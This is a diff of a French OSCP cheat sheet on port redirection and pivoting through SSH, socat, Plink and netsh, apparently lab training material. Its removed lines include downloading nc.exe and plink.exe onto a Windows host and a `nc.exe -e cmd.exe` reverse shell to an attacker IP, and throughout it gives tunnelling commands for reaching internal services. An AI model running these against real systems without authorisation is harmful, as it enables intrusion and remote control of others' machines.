@@ -1,377 +1,231 @@
 ---
 title: "OSCP · Redirection de ports"
-description: "Documenter les redirections locales, distantes et dynamiques."
+description: "Comprendre et reproduire les redirections SSH, Socat, Plink et netsh."
 ---
 
-# OSCP · Redirection de ports
+# Redirection de ports
 
-Documenter les redirections locales, distantes et dynamiques.
+**Objectif :** rendre un service accessible lorsqu'il se trouve derrière un pivot, en sachant **où le port écoute** et **sur quelle machine lancer la commande**. Exemples fictifs : Kali `10.10.14.10`, pivot `10.10.10.30`, service interne `172.16.20.10:80`.
 
+## Choisir la bonne redirection
 
-## Redirection avec Socat
-
-Rediriger un flux réseau entre deux ports avec Socat.
-
-
-<p class="oscp-command-note">Configurer une connexion ou une redirection réseau.</p>
-
-```bash
-socat -ddd TCP-LISTEN:[listening_local_port_on_dmz],fork TCP:[internal_ip]:[internal_port]
-
-```
+| Technique | Exécutée sur | Résultat |
+|---|---|---|
+| SSH `-L` | Kali | Port sur Kali → service accessible depuis le pivot SSH |
+| SSH `-R` | Pivot | Port sur Kali (serveur SSH) → service accessible depuis le pivot |
+| SSH `-D` | Kali | Proxy SOCKS sur Kali → réseau accessible depuis le pivot |
+| Socat | Machine intermédiaire | Port TCP du pivot → service interne |
+| Plink `-R` | Windows pivot | Même logique que SSH `-R` avec l'outil PuTTY |
+| Windows `netsh portproxy` | Windows pivot, administrateur | Relais TCP entre deux adresses/ports |
 
 
+**Comprendre les ports :** le **port d'écoute** est le port auquel vous vous connectez ; le **port cible** est celui du service final. La machine qui héberge le port d'écoute dépend de `-L`, `-R` et de l'outil.
 
-### Écoute TCP avec fermeture après la connexion
+## SSH : redirection locale
 
-Rediriger les connexions d'un port local vers une cible du laboratoire ; fork permet plusieurs sessions.
+Vous avez un accès SSH au pivot, qui peut joindre un service interne. **Kali crée un port local** pour joindre ce service.
 
-<p class="oscp-command-note">Écoute TCP avec fermeture après la connexion.</p>
+### Ouvrir la redirection locale
 
-```bash
-socat -d -d TCP-LISTEN:<PORT_LOCAL>,reuseaddr,fork TCP:<IP_CIBLE>:<PORT_CIBLE>
-```
+`127.0.0.1:8080` sur Kali redirige vers `172.16.20.10:80` depuis le pivot SSH.
 
-## Redirection SSH locale
-
-Rendre un service distant accessible depuis un port local.
-
-
-<p class="oscp-command-note">Configurer une redirection SSH.</p>
+<p class="oscp-command-note">Sur Kali — garder le terminal ouvert.</p>
 
 ```bash
-ssh -N -L 0.0.0.0:[local_port_on_rev_shell]:[internal_ip_target]:[internal_ip_port] username@internal_host
-
+ssh -N -L 127.0.0.1:8080:172.16.20.10:80 etudiant@10.10.10.30
 ```
 
+### Tester le port local
 
+Tester le service HTTP distant depuis la boucle locale de Kali.
 
-### Liaison uniquement sur localhost
-
-Ne pas exposer le port redirigé aux autres machines du réseau local.
-
-<p class="oscp-command-note">Liaison uniquement sur localhost.</p>
+<p class="oscp-command-note">Sur Kali — autre terminal.</p>
 
 ```bash
-ssh -N -L 127.0.0.1:<PORT_LOCAL>:127.0.0.1:<PORT_CIBLE> <UTILISATEUR>@<SERVEUR_SSH>
+curl -I http://127.0.0.1:8080/
 ```
 
-## Redirection SSH dynamique
+**`-L` = Local** : le port d'écoute se trouve sur la machine qui lance SSH, ici Kali. `-N` n'ouvre pas de shell distant.
 
-Créer un proxy SOCKS local avec SSH.
+## SSH : redirection distante / inverse
 
+Le pivot peut joindre Kali par SSH, mais Kali ne peut pas accéder directement au service du pivot. Le pivot demande à SSH d'ouvrir un port **sur Kali**.
 
-<p class="oscp-command-note">Configurer une redirection SSH.</p>
+### Ouvrir un port sur Kali depuis le pivot
+
+`127.0.0.1:9090` écoute sur Kali (serveur SSH), puis conduit au `127.0.0.1:80` du pivot.
+
+<p class="oscp-command-note">Sur le pivot — Linux ou Windows avec client SSH.</p>
 
 ```bash
-ssh -N -D 0.0.0.0:[local_socks_proxy_port] username@internal_host
-
+ssh -N -R 127.0.0.1:9090:127.0.0.1:80 kali@10.10.14.10
 ```
 
+### Tester la redirection inverse
 
+La requête arrive sur le service qui écoute sur le port 80 du pivot.
 
+<p class="oscp-command-note">Sur Kali — autre terminal.</p>
 
 ```bash
-# /etc/proxychains4.conf
-[ProxyList]
-socks5 127.0.0.1 [local_socks_proxy_port]
-
+curl -I http://127.0.0.1:9090/
 ```
 
+**`-R` = Remote** : le port d'écoute est **sur le serveur SSH** (ici Kali). Le serveur SSH doit permettre ce type de redirection. Avec `127.0.0.1`, ce port n'est pas exposé aux autres machines.
 
-<p class="oscp-command-note">Utiliser une commande au travers d&#x27;un proxy.</p>
+## SSH : proxy SOCKS dynamique
+
+Cette méthode est utile pour des outils capables d'utiliser SOCKS. **À la différence de Ligolo-ng, aucun réseau TUN n'est créé**.
+
+### Ouvrir un proxy SOCKS sur Kali
+
+Le proxy SOCKS écoute uniquement sur `127.0.0.1:9050` de Kali.
+
+<p class="oscp-command-note">Sur Kali — connexion SSH au pivot.</p>
 
 ```bash
-# Par exemple
-proxychains smbclient -L //internal_ip/ -U username --password=password
-
+ssh -N -D 127.0.0.1:9050 etudiant@10.10.10.30
 ```
 
+### Tester une URL interne via SOCKS
 
-## Redirection SSH distante
+L'option `--socks5-hostname` conserve la résolution de nom côté proxy, quand un nom interne est utilisé.
 
-Exposer un port local depuis un serveur SSH distant.
-
-
-<p class="oscp-command-note">Configurer une redirection SSH.</p>
+<p class="oscp-command-note">Sur Kali — autre terminal.</p>
 
 ```bash
-ssh -N -R 127.0.0.1:[remote_port_on_ssh_host]:[internal_target_ip]:[internal_target_port] username@remote_host
-
+curl --socks5-hostname 127.0.0.1:9050 -I http://172.16.20.10/
 ```
 
+Si besoin, ajouter `socks5 127.0.0.1 9050` sous `[ProxyList]` dans `/etc/proxychains4.conf` et utiliser `proxychains4 <commande>`. Pour Nmap derrière SOCKS, commencer par `-sT -Pn`.
 
+## Socat : transfert TCP entre deux ports
 
-### Port distant disponible sur localhost
+Socat est pratique lorsqu'un pivot peut joindre le service interne et qu'un port TCP de ce pivot est accessible depuis Kali.
 
-Créer une redirection inverse dont le port d'écoute reste lié à l'interface loopback du serveur SSH.
+### Écouter sur le pivot et relayer vers l'interne
 
-<p class="oscp-command-note">Port distant disponible sur localhost.</p>
+Le pivot écoute sur TCP `8080` et retransmet vers `172.16.20.10:80`.
+
+<p class="oscp-command-note">Sur le pivot Linux — dans un laboratoire autorisé.</p>
 
 ```bash
-ssh -N -R 127.0.0.1:<PORT_DISTANT>:127.0.0.1:<PORT_LOCAL> <UTILISATEUR>@<SERVEUR_SSH>
+socat TCP-LISTEN:8080,bind=0.0.0.0,reuseaddr,fork TCP:172.16.20.10:80
 ```
 
-## Redirection dynamique distante via SSH
+### Tester le port exposé par le pivot
 
-Créer un proxy SOCKS sur le serveur SSH distant.
+Se connecter au port 8080 du pivot.
 
-
-<p class="oscp-command-note">Configurer une redirection SSH.</p>
+<p class="oscp-command-note">Sur Kali — autre terminal.</p>
 
 ```bash
-ssh -N -R [proxychains_port] username@remote_host
-
+curl -I http://10.10.10.30:8080/
 ```
 
+`fork` autorise plusieurs connexions ; `reuseaddr` facilite le redémarrage. `0.0.0.0` expose le port sur les interfaces du pivot : restreindre l'écoute si possible.
 
+## Windows : redirection avec OpenSSH
 
+OpenSSH Client doit être installé sur Windows et Kali doit héberger SSH. Ici, Windows redirige son RDP local (`3389`) vers un port accessible **sur Kali**.
 
-```bash
-# /etc/proxychains4.conf
-[ProxyList]
-socks5 127.0.0.1 [proxychains_port]
+### Créer le tunnel depuis Windows
 
-```
+Le port `9090` est lié à `127.0.0.1` sur Kali. Aucune règle pare-feu entrante Windows n'est nécessaire pour ce port SSH distant.
 
-
-## Redirection SSH sous Windows
-
-Configurer une redirection SSH depuis Windows.
-
-
-
+<p class="oscp-command-note">Sur le pivot Windows — PowerShell.</p>
 
 ```powershell
-where ssh
-ssh.exe -V
-
+ssh.exe -N -R 127.0.0.1:9090:127.0.0.1:3389 kali@10.10.14.10
 ```
 
+### Accéder au RDP via la redirection
 
-<p class="oscp-command-note">Configurer une redirection SSH.</p>
+Un client RDP peut utiliser le port local. La cible doit autoriser la session RDP et les identifiants utilisés.
 
-```powershell
-ssh -N -R [REMOTE_PORT]:localhost:[LOCAL_PORT] [USER]@[REMOTE_HOST]
-
-```
-
-
-
+<p class="oscp-command-note">Sur Kali — terminal Linux.</p>
 
 ```bash
-# Edit /etc/proxychains4.conf and add
-[ProxyList]
-socks5 127.0.0.1 [REMOTE_PORT]
-
+xfreerdp3 /v:127.0.0.1:9090 /u:etudiant /dynamic-resolution
 ```
 
+## Windows : redirection avec Plink
 
+Plink est l'outil SSH en ligne de commande de PuTTY. Utile si le client OpenSSH Windows n'est pas disponible.
 
+### Créer la redirection inverse avec Plink
 
-```bash
-ss -ntplu
+Conserver la session active. Lors de la première connexion, **vérifier** l'empreinte de la clé SSH du serveur.
 
-```
-
-
-## Redirection avec Plink sous Windows
-
-Utiliser Plink pour rediriger un port sous Windows.
-
-
-<p class="oscp-command-note">Examiner l&#x27;état des services Linux.</p>
-
-```bash
-sudo systemctl start apache2
-
-```
-
-
-**Paramètres et repères :**
-`nc.exe`  
-
-
-<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
-
-```bash
-find / -name nc.exe 2>/dev/null
-sudo cp [SOURCE_PATH]/nc.exe /var/www/html/
-
-```
-
-
-**Paramètres et repères :**
-`nc.exe`  
-
-
-<p class="oscp-command-note">Télécharger une ressource distante.</p>
+<p class="oscp-command-note">Sur Windows — PowerShell ou CMD.</p>
 
 ```powershell
-wget -Uri http://[KALI_IP]/nc.exe -OutFile C:\Windows\Temp\nc.exe
-
+.\plink.exe -ssh -N -R 127.0.0.1:9090:127.0.0.1:3389 kali@10.10.14.10
 ```
 
+Éviter de fournir un mot de passe avec `-pw` dans un historique de terminal ; saisir l'authentification de manière interactive si l'environnement le permet.
 
-**Paramètres et repères :**
-`nc.exe`  
+## Windows : redirection TCP avec netsh
 
+`netsh interface portproxy` modifie la configuration Windows : **droits administrateur requis**. Seul le trafic TCP est pris en charge ; le service IP Helper doit être opérationnel. Prévoir la suppression de la règle après le test.
 
+### Créer une règle de redirection TCP
 
+Le pivot écoute sur `0.0.0.0:8080` et transmet vers `172.16.20.10:80`.
+
+<p class="oscp-command-note">Sur le pivot Windows — PowerShell administrateur.</p>
 
 ```powershell
-C:\Windows\Temp\nc.exe -e cmd.exe [KALI_IP] [PORT]
-
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=172.16.20.10 connectport=80
 ```
 
+### Contrôler la configuration
 
-<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
+Lister les règles et vérifier le port d'écoute.
 
-```bash
-find / -name plink.exe 2>/dev/null
-sudo cp [SOURCE_PATH]/plink.exe /var/www/html/
-
-```
-
-
-<p class="oscp-command-note">Télécharger une ressource distante.</p>
-
-```powershell
-wget -Uri http://[KALI_IP]/plink.exe -OutFile C:\Windows\Temp\plink.exe
-
-```
-
-
-
-
-```powershell
-cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l [USER] -pw [PASSWORD] -R [LOCAL_PORT]:127.0.0.1:[REMOTE_PORT] [KALI_IP]
-
-```
-
-
-<p class="oscp-command-note">Ouvrir une session RDP.</p>
-
-```bash
-xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:127.0.0.1:[LOCAL_PORT]
-
-```
-
-
-## Redirection avec netsh sous Windows
-
-Créer une redirection TCP avec netsh portproxy.
-
-
-**Paramètres et repères :**
-`Netsh`  
-
-
-<p class="oscp-command-note">Examiner les paramètres réseau Windows.</p>
-
-```powershell
-netsh interface portproxy add v4tov4 listenport=[LISTEN_PORT] listenaddress=[LISTEN_IP] connectport=[CONNECT_PORT] connectaddress=[CONNECT_IP]
-
-```
-
-
-<p class="oscp-command-note">Examiner les ports et connexions réseau.</p>
-
-```powershell
-netstat -anp TCP | find "[LISTEN_PORT]"
-
-```
-
-
-<p class="oscp-command-note">Examiner les paramètres réseau Windows.</p>
+<p class="oscp-command-note">Sur le même Windows — PowerShell.</p>
 
 ```powershell
 netsh interface portproxy show all
-
+Get-NetTCPConnection -State Listen | Where-Object LocalPort -eq 8080
 ```
 
+**Si le pare-feu bloque TCP 8080**, seule une personne autorisée à administrer le poste doit ouvrir le port. Ne pas désactiver tout le pare-feu pour résoudre ce problème.
+
+### Retirer la règle après le test
+
+Supprimer uniquement la redirection créée dans cet exemple.
+
+<p class="oscp-command-note">Sur Windows — PowerShell administrateur.</p>
 
 ```powershell
-# Examiner ou modifier le routage réseau Windows
-netsh advfirewall firewall add rule name="[RULE_NAME]" protocol=TCP dir=in localip=[LISTEN_IP] localport=[LISTEN_PORT] action=allow
-
+netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8080
 ```
 
+## Ligolo-ng : tunnel complet plutôt que port par port
 
-<p class="oscp-command-note">Ouvrir une connexion SSH.</p>
+Si vous avez besoin d'atteindre plusieurs machines du réseau interne, **Ligolo-ng est souvent plus pratique** : il crée une interface TUN et une route réseau, sans ouvrir une redirection par service.
 
-```bash
-ssh [USER]@[LISTEN_IP] -p[LISTEN_PORT]
+Consulter la [fiche Ligolo-ng pas à pas](./tunneling.md) : tunnel simple, double pivot, accès à `127.0.0.1` du pivot et listeners.
 
-```
+## Dépannage express
 
-
-<p class="oscp-command-note">Examiner les paramètres réseau Windows.</p>
-
-```powershell
-netsh advfirewall firewall delete rule name="[RULE_NAME]"
-
-```
-
-
-```powershell
-# Configurer une redirection de port avec Netsh
-netsh interface portproxy del v4tov4 listenport=[LISTEN_PORT] listenaddress=[LISTEN_IP]
-
-```
+| Symptôme | Contrôle |
+|---|---|
+| Port inaccessible | Service en écoute et adresse de liaison corrects ? |
+| SSH `administratively prohibited` | Redirection refusée par le serveur SSH |
+| `Address already in use` | Port déjà utilisé : `ss -ltnp` ou `Get-NetTCPConnection` |
+| ProxyChains ne répond pas | SOCKS actif et bon port renseigné dans `proxychains4.conf` |
+| `netsh` configuré mais muet | IP Helper, port Windows, route et pare-feu |
+| Ligolo traverse plusieurs sous-réseaux | Vérifier l'interface TUN et les routes avec la fiche dédiée |
 
 
+## Références
 
-### Vérifier une règle portproxy précise
+- [Documentation officielle d'OpenSSH](https://man.openbsd.org/ssh)
 
-Lister les redirections Windows en place avant et après un changement autorisé.
+- [Microsoft — netsh interface portproxy](https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy)
 
-<p class="oscp-command-note">Vérifier une règle portproxy précise.</p>
+- [Ligolo-ng — Quickstart](https://docs.ligolo.ng/Quickstart/)
 
-```bash
-netsh interface portproxy show v4tov4
-```
-
-### Vérifier les ports Windows en écoute
-
-Contrôler si un port local est utilisé par un processus avant d'ajouter une redirection.
-
-<p class="oscp-command-note">Vérifier les ports Windows en écoute.</p>
-
-```powershell
-Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,OwningProcess
-```
-
-## Redirections : diagnostics et vérifications
-
-Vérifier les interfaces et ports concernés avant de créer des redirections. Ne pas confondre tunnel SSH local, tunnel distant, proxy SOCKS et transfert TCP.
-
-### Redirection TCP avec Socat
-
-Écouter localement et transmettre chaque connexion TCP vers un service distant autorisé.
-
-<p class="oscp-command-note">Redirection TCP avec Socat.</p>
-
-```bash
-socat TCP-LISTEN:<PORT_LOCAL>,reuseaddr,fork TCP:<IP_SERVICE>:<PORT_SERVICE>
-```
-
-### Redirection SSH vers un serveur distant
-
-Exposer un port de la machine locale depuis le serveur SSH, en fonction de sa politique GatewayPorts et de son bind.
-
-<p class="oscp-command-note">Redirection SSH vers un serveur distant.</p>
-
-```bash
-ssh -N -R 127.0.0.1:9090:127.0.0.1:80 <UTILISATEUR>@<SERVEUR_SSH>
-```
-
-**Référence complémentaire :** [Notes de krovs](https://github.com/krovs/oscp-notes/blob/main/docs/17_port_red_tun.md). Synthèse rédigée pour SKILL-ISSUE.
-
-<!-- notes-krovs-2026 -->
-
----
-
-Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
-
-<!-- refined-oscp -->
+- [krovs — exemples de redirection](https://github.com/krovs/oscp-notes/blob/main/docs/17_port_red_tun.md)
